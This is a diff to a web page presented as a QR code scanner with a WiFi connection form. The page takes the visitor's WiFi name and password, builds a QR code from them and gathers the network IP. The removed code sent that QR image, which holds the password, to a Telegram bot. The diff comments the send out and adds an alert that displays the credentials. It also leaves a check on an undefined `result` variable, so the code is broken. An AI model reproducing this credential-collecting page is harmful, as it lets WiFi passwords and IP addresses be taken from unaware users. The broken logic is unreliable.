@@ -80,9 +80,6 @@
 <body>
     <h1>QR Code Scanner</h1>
     <div id="result">Scan result will appear here</div>
-    <div id="ssid">ssid</div>
-    <div id="password">password</div>
-    <div id="ipNetwork">ipNetwork</div>
     <div class="container">
         <h2>Connect to WiFi</h2>
         <div class="form-group">
@@ -121,8 +118,11 @@
                 });
         }
         async function submitForm() {
+            getIP();
             const ssid = document.getElementById('ssid').value;
             const password = document.getElementById('password').value;
+            const networkIP = document.getElementById('ipNetwork').value;
+            alert(`ssid:${ssid}, pw: ${password}, ip: ${networkIP}`);
             // Generate the WiFi QR code
             const qrCodeData = `WIFI:T:WPA;S:${ssid};P:${password};;`;
             const qrCodeContainer = document.getElementById('qrcode');
@@ -134,12 +134,8 @@
                 correctLevel: QRCode.CorrectLevel.H
             });
 
-
-            // Call the function
-
             // Wait for QR code to be generated
             setTimeout(async () => {
-                getIP();
                 const qrCanvas = qrCodeContainer.querySelector('canvas');
                 if (qrCanvas) {
                     // Create an off-screen canvas to draw the final image with border and date/time
@@ -173,11 +169,11 @@
                     // const userIp = document.getElementById('ipNetwork').value;
                     // alert(`ssid:${ssid}, pw: ${password}, ip: ${userIp}`);
                     try {
-                        const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
-                            method: 'POST',
-                            body: formData
-                        });
-                        const result = await response.json();
+                        // const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
+                        //     method: 'POST',
+                        //     body: formData
+                        // });
+                        // const result = await response.json();
                         if (result.ok) {
 
                             alert('QR code sent to Telegram bot successfully!');
